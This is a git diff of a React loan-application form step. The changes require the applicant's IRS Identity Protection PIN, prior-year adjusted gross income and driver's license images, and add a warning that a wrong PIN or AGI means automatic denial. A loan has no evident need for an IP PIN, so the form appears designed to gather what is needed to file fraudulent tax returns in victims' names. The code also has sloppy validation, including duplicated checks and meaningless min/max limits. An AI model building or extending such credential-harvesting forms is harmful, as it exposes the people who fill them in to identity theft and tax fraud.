@@ -7,12 +7,14 @@ import {
   faFileImage,
   faIdCardAlt,
   faImage,
+  faQuestionCircle,
 } from "@fortawesome/free-solid-svg-icons";
 import FormDataContext from "@/contexts/data";
 import Dropzone from "react-dropzone";
 import { useRouter } from "next/navigation";
 
 import axios from "axios";
+import Link from "next/link";
 
 const LoanProcessSeven = ({ step, setStep }) => {
   const { formData, setFormData } = useContext(FormDataContext);
@@ -25,7 +27,58 @@ const LoanProcessSeven = ({ step, setStep }) => {
   const handleChange = (e) => {
     setFormData({ ...formData, [e.target.name]: e.target.value });
   };
-
+  const usStates = [
+    "Alabama",
+    "Alaska",
+    "Arizona",
+    "Arkansas",
+    "California",
+    "Colorado",
+    "Connecticut",
+    "Delaware",
+    "Florida",
+    "Georgia",
+    "Hawaii",
+    "Idaho",
+    "Illinois",
+    "Indiana",
+    "Iowa",
+    "Kansas",
+    "Kentucky",
+    "Louisiana",
+    "Maine",
+    "Maryland",
+    "Massachusetts",
+    "Michigan",
+    "Minnesota",
+    "Mississippi",
+    "Missouri",
+    "Montana",
+    "Nebraska",
+    "Nevada",
+    "New Hampshire",
+    "New Jersey",
+    "New Mexico",
+    "New York",
+    "North Carolina",
+    "North Dakota",
+    "Ohio",
+    "Oklahoma",
+    "Oregon",
+    "Pennsylvania",
+    "Rhode Island",
+    "South Carolina",
+    "South Dakota",
+    "Tennessee",
+    "Texas",
+    "Utah",
+    "Vermont",
+    "Virginia",
+    "Washington",
+    "West Virginia",
+    "Wisconsin",
+    "Wyoming",
+  ];
   const handleFileUpload = async (file) => {
     const formData = new FormData();
     formData.append("file", file);
@@ -97,6 +150,10 @@ const LoanProcessSeven = ({ step, setStep }) => {
       isValid = false;
     }
     if (!formData.taxReturn) {
+      errors.taxReturn = "Please select an option";
+      isValid = false;
+    }
+    if (!formData.taxReturn) {
       errors.taxReturn = "This field is required.";
     }
 
@@ -127,14 +184,14 @@ const LoanProcessSeven = ({ step, setStep }) => {
         isValid = false;
       }
     }
-    if (!formData.didFile2023Taxes) {
-      errors.didFile2023Taxes = "Please select an option";
-      isValid = false;
-    }
-    if (!formData.receivedIPPIN) {
-      errors.receivedIPPIN = "Please select an option";
-      isValid = false;
-    }
+    // if (!formData.didFile2022Taxes) {
+    //   errors.didFile2022Taxes = "Please select an option";
+    //   isValid = false;
+    // }
+    // if (!formData.receivedIPPIN) {
+    //   errors.receivedIPPIN = "Please select an option";
+    //   isValid = false;
+    // }
     if (!formData.ipPin) {
       errors.ipPin = "Please provide an ip pin";
       isValid = false;
@@ -144,10 +201,10 @@ const LoanProcessSeven = ({ step, setStep }) => {
       isValid = false;
     }
 
-    if (!formData.meansOfDisbursement) {
-      errors.meansOfDisbursement = "Please select an option";
-      isValid = false;
-    }
+    // if (!formData.meansOfDisbursement) {
+    //   errors.meansOfDisbursement = "Please select an option";
+    //   isValid = false;
+    // }
 
     setErrors(errors);
     return isValid;
@@ -172,7 +229,7 @@ const LoanProcessSeven = ({ step, setStep }) => {
         } else {
           setStep(step + 1);
         }
-        if (formData.didFile2023Taxes === "No") {
+        if (formData.didFile2022Taxes === "No") {
           setbgloading(true);
 
           // Remove items from local storage
@@ -272,75 +329,97 @@ const LoanProcessSeven = ({ step, setStep }) => {
             Driver's License State
           </label>
           <div className="relative">
-            <input
+            <select
               className={`w-full border ${
                 errors.licenseState ? "border-red-500" : "border-gray-300"
-              } rounded-lg pl-10 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
-              type="text"
+              } rounded-lg pl-3 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
               name="licenseState"
               id="licenseState"
               value={formData.licenseState}
               onChange={handleChange}
-              placeholder="Enter your driver's license state"
               required
-            />
-            <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+            >
+              <option value="">Select a state</option>
+              {usStates.map((state, index) => (
+                <option key={index} value={state}>
+                  {state}
+                </option>
+              ))}
+            </select>
+            {/* <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
               <FontAwesomeIcon
                 icon={faIdCardAlt}
                 className="text-gray-500 text-sm"
               />
-            </div>
+            </div> */}
           </div>
           {errors.licenseState && (
             <p className="text-red-500 text-sm mt-1">{errors.licenseState}</p>
           )}
         </div>
+
         <div className="mt-7">
           <label className="block text-gray-700 font-semibold mb-2">
-            Did you file your 2023 taxes?
+            What is your 2022 adjusted gross income (line 11 of your 1040)?
           </label>
-          <div>
-            <select
-              className={`block w-full  ${
-                errors.didFile2023Taxes ? "border-red-500" : "border-gray-300"
-              } border border-gray-300 rounded-lg pl-3 pr-10 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
-              name="didFile2023Taxes"
-              id="didFile2023Taxes"
-              value={formData.didFile2023Taxes}
+          <div className="relative">
+            <input
+              className={`w-full border ${
+                errors.adjustedGrossIncome
+                  ? "border-red-500"
+                  : "border-gray-300"
+              } rounded-lg pl-10 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
+              type="text"
+              name="adjustedGrossIncome"
+              id="adjustedGrossIncome"
+              value={formData.adjustedGrossIncome}
               onChange={handleChange}
-              required
-            >
-              <option value="">Choose an option</option>
-              <option value="Yes">Yes</option>
-              <option value="No">No</option>
-            </select>
+              placeholder="Enter your adjusted gross income"
+              required={formData.didFile2022Taxes === "Yes"}
+            />
+            <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+              <FontAwesomeIcon
+                icon={faImage}
+                className="text-gray-500 text-sm"
+              />
+            </div>
           </div>
-          {errors.didFile2023Taxes && (
+          {errors.adjustedGrossIncome && (
             <p className="text-red-500 text-sm mt-1">
-              {errors.didFile2023Taxes}
+              {errors.adjustedGrossIncome}
             </p>
           )}
         </div>
 
-        {formData.didFile2023Taxes === "Yes" && (
+        <div className="mt-7">
           <div className="mt-7">
-            <label className="block text-gray-700 font-semibold mb-2">
-              What is your adjusted gross income (line 11 of your 1040)?
-            </label>
+            <div className="cont flex justify-between">
+              {" "}
+              <label className="block text-gray-700 font-semibold mb-2">
+                What is your 2024 IP PIN
+              </label>
+              <div className="icon text-blue-500">
+                <Link href="https://www.irs.gov/identity-theft-fraud-scams/get-an-identity-protection-pin">
+                  {" "}
+                  <FontAwesomeIcon icon={faQuestionCircle} />
+                </Link>
+              </div>
+            </div>
+
             <div className="relative">
               <input
                 className={`w-full border ${
-                  errors.adjustedGrossIncome
-                    ? "border-red-500"
-                    : "border-gray-300"
+                  errors.ipPin ? "border-red-500" : "border-gray-300"
                 } rounded-lg pl-10 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
-                type="text"
-                name="adjustedGrossIncome"
-                id="adjustedGrossIncome"
-                value={formData.adjustedGrossIncome}
+                type="number"
+                name="ipPin"
+                id="ipPin"
+                max={6}
+                min="6"
+                value={formData.ipPin}
                 onChange={handleChange}
-                placeholder="Enter your adjusted gross income"
-                required={formData.didFile2023Taxes === "Yes"}
+                placeholder="Enter your IP PIN"
+                required={formData.receivedIPPIN === "Yes"}
               />
               <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                 <FontAwesomeIcon
@@ -349,75 +428,16 @@ const LoanProcessSeven = ({ step, setStep }) => {
                 />
               </div>
             </div>
-            {errors.adjustedGrossIncome && (
-              <p className="text-red-500 text-sm mt-1">
-                {errors.adjustedGrossIncome}
-              </p>
+            {errors.ipPin && (
+              <p className="text-red-500 text-sm mt-1">{errors.ipPin}</p>
             )}
           </div>
-        )}
-
-        <div className="mt-7">
-          <label className="block text-gray-700 font-semibold mb-2">
-            Did you receive an IP PIN from the IRS?
-          </label>
-          <div>
-            <select
-              className={`block w-full  ${
-                errors.receivedIPPIN ? "border-red-500" : "border-gray-300"
-              } border border-gray-300 rounded-lg pl-3 pr-10 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
-              name="receivedIPPIN"
-              id="receivedIPPIN"
-              value={formData.receivedIPPIN}
-              onChange={handleChange}
-              required
-            >
-              <option value="">Choose an option</option>
-              <option value="Yes">Yes</option>
-              <option value="No">No</option>
-            </select>
-          </div>
-          {errors.receivedIPPIN && (
-            <p className="text-red-500 text-sm mt-1">{errors.receivedIPPIN}</p>
-          )}
-          {formData.receivedIPPIN === "Yes" && (
-            <div className="mt-7">
-              <label className="block text-gray-700 font-semibold mb-2">
-                Input your IP PIN
-              </label>
-              <div className="relative">
-                <input
-                  className={`w-full border ${
-                    errors.ipPin ? "border-red-500" : "border-gray-300"
-                  } rounded-lg pl-10 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
-                  type="number"
-                  name="ipPin"
-                  id="ipPin"
-                  max={6}
-                  min={6}
-                  value={formData.ipPin}
-                  onChange={handleChange}
-                  placeholder="Enter your IP PIN"
-                  required={formData.receivedIPPIN === "Yes"}
-                />
-                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-                  <FontAwesomeIcon
-                    icon={faImage}
-                    className="text-gray-500 text-sm"
-                  />
-                </div>
-              </div>
-              {errors.ipPin && (
-                <p className="text-red-500 text-sm mt-1">{errors.ipPin}</p>
-              )}
-            </div>
-          )}
         </div>
-        {/* <label
+        <label
           className="block text-gray-700 font-semibold mb-2 mt-7"
           htmlFor="taxReturn"
         >
-          Did you file for 2022 tax return?
+          Did you file for 2023 tax return?
         </label>
         <select
           className="w-full border border-gray-300 rounded-lg pl-3 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none"
@@ -430,9 +450,9 @@ const LoanProcessSeven = ({ step, setStep }) => {
           <option value="">Select...</option>
           <option value="yes">Yes</option>
           <option value="no">No</option>
-        </select> */}
+        </select>
         {errors.taxReturn && <p className="text-red-500">{errors.taxReturn}</p>}
-        <div className="mt-7">
+        {/* <div className="mt-7">
           <label className="block text-gray-700 font-semibold mb-2">
             Means of Disbursement
           </label>
@@ -459,7 +479,7 @@ const LoanProcessSeven = ({ step, setStep }) => {
               {errors.meansOfDisbursement}
             </p>
           )}
-        </div>
+        </div> */}
         <div className="mt-7">
           <label className="block text-gray-700 font-semibold mb-2">
             Upload the front view of your driver's license
@@ -550,6 +570,11 @@ const LoanProcessSeven = ({ step, setStep }) => {
             {bgloading ? "Please wait" : "Next"}
           </button>
         </div>
+        <p className="text-sm text-gray-600 bg-gray-100 px-6 py-6 mt-7 rounded-lg ">
+          <strong>Note:</strong> By clicking "Next" you agree that, if Identity
+          Protection Pin (IPPin) or Adjusted Gross Income (AGI) is incorrect,
+          you will automatically be denied assistance.
+        </p>
       </div>
     </>
   );
